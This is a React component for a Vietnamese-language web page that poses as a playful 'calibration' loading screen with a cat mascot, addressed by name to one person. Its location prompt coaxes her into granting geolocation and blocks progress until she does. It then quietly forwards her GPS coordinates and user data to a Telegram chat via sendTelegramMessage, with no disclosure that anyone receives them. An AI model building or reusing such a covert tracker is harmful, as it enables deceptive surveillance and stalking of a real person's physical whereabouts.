import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, Zap, Search, Heart, MapPin, Sparkles, Satellite, AlertCircle } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';
import AstroCat from './AstroCat';

const Calibration = ({ onComplete, userData }) => {
  const [step, setStep] = useState(0);
  const [showLocationPrompt, setShowLocationPrompt] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);
  const [locationError, setLocationError] = useState(false);
  const [mascotState, setMascotState] = useState('thinking');
  const [bubbleText, setBubbleText] = useState("Huyền ơi, Mèo máy đang bị lạc giữa các vì sao... ✨");

  const messages = [
    { text: "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
    { text: "Đang kiểm tra độ xinh đẹp... (100% rồi nha! 🌸)", icon: <Zap className="w-5 h-5 text-yellow-400" /> },
    { text: "Đang đuổi mấy đám mây buồn đi chỗ khác... ☁️", icon: <Loader2 className="w-5 h-5 animate-spin text-purple-400" /> },
    { text: "Pha một chút trà sữa vào hệ thống... 🧋", icon: <Heart className="w-5 h-5 text-red-400" /> },
    { text: "Mọi thứ đã sẵn sàng! Meowww... 🐾", icon: <Zap className="w-5 h-5 text-green-400" /> }
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev === 2) { // Ở bước này, chúng ta sẽ hiện popup xin vị trí
          clearInterval(timer);
          setShowLocationPrompt(true);
          setBubbleText("Em bật 'tín hiệu' để Mèo máy tìm đường về chỗ em nhé! 🐾");
          return prev;
        }
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);

    return () => clearInterval(timer);
  }, []);

  const handleRequestLocation = () => {
    setIsSyncing(true);
    setLocationError(false);
    setMascotState('thinking');
    setBubbleText("Đang bắt sóng tín hiệu... Chờ Mèo máy xíu nha! 📡");

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };
          // Gửi dữ liệu về Telegram kèm theo GPS
          sendTelegramMessage(userData, locationData);
          
          setMascotState('happy');
          setBubbleText("Hú uuu! Kết nối thành công rồi! Mèo máy đang bay vèo tới chỗ em đây! 🚀💖");

          // Tiếp tục quy trình sau khi thành công
          setTimeout(() => {
            setIsSyncing(false);
            setShowLocationPrompt(false);
            setStep(3);
            resumeCalibration();
          }, 2000);
        },
        (error) => {
          console.warn("Location denied or error:", error);
          setIsSyncing(false);
          setLocationError(true);
          setMascotState('shook');
          setBubbleText("Huhu, không có tọa độ Mèo máy không biết bay về đâu để gặp em cả... (╯︵╰,)");
        },
        { timeout: 10000 }
      );
    } else {
      setIsSyncing(false);
      setLocationError(true);
      setMascotState('shook');
      setBubbleText("Thiết bị của em không hỗ trợ 'tín hiệu vũ trụ' rồi, buồn quá đi... 😿");
    }
  };

  const resumeCalibration = () => {
    const timer = setInterval(() => {
      setStep((prev) => {
        if (prev >= messages.length - 1) {
          clearInterval(timer);
          setTimeout(onComplete, 1000);
          return prev;
        }
        return prev + 1;
      });
    }, 1500);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-[70vh] text-center p-6 relative">
      <AnimatePresence>
        {showLocationPrompt && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] bg-pink-100/40 backdrop-blur-[12px] overflow-y-auto py-10 px-4 sm:px-6"
          >
            <div className="min-h-full flex items-center justify-center">
              <motion.div
                initial={{ scale: 0.85, opacity: 0, y: 20 }}
                animate={{ scale: 1, opacity: 1, y: 0 }}
                exit={{ scale: 0.85, opacity: 0, y: 20 }}
                transition={{ type: "spring", damping: 20, stiffness: 100 }}
                className="bg-white/70 backdrop-blur-md rounded-[3.5rem] p-8 sm:p-12 max-w-md w-full shadow-[0_20px_50px_rgba(255,182,193,0.3)] border border-white/80 relative overflow-hidden"
              >
                {/* Decorative elements inside modal */}
                <div className="absolute -top-10 -right-10 w-32 h-32 bg-pink-200/30 rounded-full blur-2xl" />
                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-purple-200/30 rounded-full blur-2xl" />

                <div className="relative z-10 space-y-8">
                  <div className="relative flex flex-col items-center">
                    <AnimatePresence mode="wait">
                      <motion.div
                        key={bubbleText}
                        initial={{ scale: 0, opacity: 0, y: 10 }}
                        animate={{ scale: 1, opacity: 1, y: 0 }}
                        exit={{ scale: 0, opacity: 0, y: 10 }}
                        className="mb-0 sm:absolute sm:mb-0 sm:-top-4 sm:-right-12 w-full max-w-[180px] sm:w-44 bg-white p-3 rounded-2xl border border-pink-100 text-[11px] font-bold text-pink-600 italic shadow-sm relative"
                      >
                        {bubbleText}
                        {/* Mũi tên trỏ xuống cho mobile */}
                        <div className="sm:hidden absolute -bottom-1.5 left-1/2 -translate-x-1/2 w-3 h-3 bg-white border-r border-b border-pink-100 rotate-45" />
                        {/* Mũi tên trỏ sang trái cho desktop */}
                        <div className="hidden sm:block absolute bottom-2 -left-1.5 w-3 h-3 bg-white border-l border-b border-pink-100 rotate-45" />
                      </motion.div>
                    </AnimatePresence>

                    <motion.div 
                      animate={{ 
                        y: [0, -10, 0],
                        rotate: mascotState === 'shook' ? [0, 5, -5, 0] : 0
                      }}
                      transition={{ repeat: Infinity, duration: 4, ease: "easeInOut" }}
                    >
                      <AstroCat state={mascotState} className="w-28 h-28 sm:w-32 sm:h-32 mx-auto" />
                    </motion.div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-2xl font-black text-slate-800 tracking-tight flex items-center justify-center gap-2">
                      {mascotState === 'happy' ? <Heart className="text-pink-500 fill-pink-500" /> : <Satellite className="text-purple-500" />}
                      {mascotState === 'happy' ? "ĐÃ KẾT NỐI!" : "TÍN HIỆU VŨ TRỤ"}
                    </h3>
                    
                    <div className="bg-white/50 p-4 rounded-2xl border border-white">
                      {!locationError && !isSyncing && mascotState !== 'happy' && (
                        <p className="text-slate-600 text-sm font-medium leading-relaxed">
                          Mèo máy cần biết Huyền đang ở đâu dưới bầu trời này để "hạ cánh" chính xác nhất. Huyền cho phép Mèo máy một xíu nhé? ✨
                        </p>
                      )}
                      {isSyncing && (
                        <div className="flex flex-col items-center gap-3 py-2">
                          <Loader2 className="w-8 h-8 text-purple-500 animate-spin" />
                          <p className="text-purple-600 font-bold text-xs animate-pulse uppercase tracking-widest">Đang bắt sóng của em...</p>
                        </div>
                      )}
                      {locationError && (
                        <div className="space-y-4">
                          <div className="space-y-2">
                            <div className="flex items-center justify-center gap-2 text-rose-500">
                              <AlertCircle size={18} />
                              <span className="font-bold text-xs uppercase tracking-wider">Lỗi kết nối vũ trụ</span>
                            </div>
                            <p className="text-slate-600 text-sm font-medium leading-relaxed">
                              Mèo máy không tìm thấy em rồi... Em hãy bật định vị ở cài đặt, sau đó nhấn nút **Tải lại trang** phía dưới để Mèo máy thử lại nha! 🥺
                            </p>
                          </div>
                          
                          <button 
                            onClick={() => window.location.reload()}
                            className="w-full py-3 bg-pink-500 text-white rounded-xl font-bold shadow-lg shadow-pink-100 flex items-center justify-center gap-2 hover:bg-pink-600 active:scale-95 transition-all text-xs"
                          >
                            <Loader2 size={16} />
                            TẢI LẠI TRANG NGAY 🔄
                          </button>
                        </div>
                      )}
                      {mascotState === 'happy' && (
                        <div className="space-y-2">
                          <p className="text-green-600 font-bold text-sm">
                            Tọa độ đã được xác minh! 📍
                          </p>
                          <p className="text-slate-600 text-xs font-medium italic">
                            Hệ thống đang chuẩn bị hạ cánh...
                          </p>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="pt-2">
                    {mascotState === 'happy' ? (
                      <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        className="bg-green-100 text-green-700 font-black py-4 rounded-2xl flex items-center justify-center gap-2 uppercase tracking-widest text-sm"
                      >
                        ĐANG ĐƯA EM ĐẾN DASHBOARD...
                      </motion.div>
                    ) : (
                      <motion.button 
                        whileHover={{ scale: 1.02, shadow: "0 10px 25px rgba(244,114,182,0.4)" }}
                        whileTap={{ scale: 0.98 }}
                        onClick={handleRequestLocation}
                        disabled={isSyncing}
                        className={`w-full py-4 rounded-2xl text-white font-black flex items-center justify-center gap-3 transition-all text-sm tracking-widest uppercase shadow-lg ${
                          locationError ? 'bg-rose-500 shadow-rose-100' : 'bg-gradient-to-r from-pink-400 to-purple-500 shadow-pink-100/50'
                        }`}
                      >
                        {isSyncing ? (
                          <>
                            <Loader2 className="animate-spin w-5 h-5" />
                            ĐANG BẮT SÓNG...
                          </>
                        ) : locationError ? (
                          <>
                            THỬ KẾT NỐI LẠI 🐾
                          </>
                        ) : (
                          <>
                            GỬI TÍN HIỆU NGAY! 🌸
                          </>
                        )}
                      </motion.button>
                    )}
                    
                    {locationError && (
                      <div className="mt-4 p-4 bg-slate-50 rounded-2xl border border-slate-100 space-y-3">
                        <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest leading-relaxed">
                          Cách bật lại định vị:
                        </p>
                        <ul className="text-[9px] text-left text-slate-500 space-y-1 font-medium list-disc pl-4">
                          <li><strong>iPhone:</strong> Cài đặt {'>'} Quyền riêng tư {'>'} Dịch vụ định vị {'>'} Bật cho Trình duyệt.</li>
                          <li><strong>Android:</strong> Cài đặt {'>'} Vị trí {'>'} Quyền ứng dụng {'>'} Bật cho Trình duyệt.</li>
                          <li><strong>Trình duyệt:</strong> Nhấn vào icon cài đặt/ổ khóa trên thanh địa chỉ.</li>
                        </ul>
                        <p className="text-[9px] text-pink-500 font-bold italic pt-1">
                          *Bật xong em nhớ quay lại đây nhấn "Thử kết nối lại" nhé!
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </motion.div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="relative mb-12">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ repeat: Infinity, duration: 4, ease: "linear" }}
          className="w-32 h-32 border-4 border-dashed border-pink-500/30 rounded-full"
        />
        <div className="absolute inset-0 flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-pink-600 animate-spin" />
        </div>
      </div>

      <div className="h-20 flex items-center justify-center">
        <AnimatePresence mode="wait">
          <motion.div
            key={step}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="flex items-center gap-3 bg-white/50 px-6 py-3 rounded-2xl shadow-sm border border-white/50"
          >
            {messages[step].icon}
            <span className="text-slate-700 font-medium">{messages[step].text}</span>
          </motion.div>
        </AnimatePresence>
      </div>

      <div className="mt-8 w-64 bg-slate-200 rounded-full h-1.5 overflow-hidden">
        <motion.div
          initial={{ width: 0 }}
          animate={{ width: `${((step + 1) / messages.length) * 100}%` }}
          className="h-full bg-pink-500"
        />
      </div>
      <p className="mt-4 text-[10px] text-slate-400 uppercase tracking-widest">System Calibrating...</p>
    </div>
  );
};

export default Calibration;
